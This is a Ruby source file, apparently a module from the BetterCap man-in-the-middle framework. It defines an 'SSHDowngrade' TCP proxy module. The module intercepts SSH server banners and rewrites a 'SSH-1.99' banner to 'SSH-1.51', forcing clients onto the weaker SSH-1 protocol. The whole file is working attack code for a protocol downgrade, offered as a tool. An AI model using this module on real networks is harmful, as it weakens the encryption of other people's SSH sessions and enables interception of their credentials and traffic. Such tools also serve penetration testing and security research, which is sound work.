=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : https://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
class SSHDowngrade < BetterCap::Proxy::TCP::Module
  meta(
    'Name'        => 'SSHDowngrade',
    'Description' => 'Downgrades SSH from protocol 2.* to 1.* .',
    'Version'     => '1.0.0',
    'Author'      => "Simone 'evilsocket' Margaritelli",
    'License'     => 'GPL3'
  )

  def on_response( event )
    if event.data =~ /^(SSH-([\d\.]+).+).*/
      banner  = $1.strip
      version = $2.strip
      BetterCap::Logger.info "[#{'SSH DOWNGRADE'.green}] Intercepted server banner '#{banner}'."

      if version.start_with?('1.9')
        BetterCap::Logger.info "[#{'SSH DOWNGRADE'.green}] Downgrading to 'SSH-1.51' ..."
        event.data.gsub!( "SSH-#{version}", 'SSH-1.51' )

      elsif version.start_with?('2.0')
        BetterCap::Logger.info "[#{'SSH DOWNGRADE'.green}] #{'Server only supports SSH 2.0, downgrading is not possible.'.red}"

      elsif version.start_with?('1.5')
        BetterCap::Logger.info "[#{'SSH DOWNGRADE'.green}] Server already supports only SSH 1.X :D"

      end
    end
  end
end
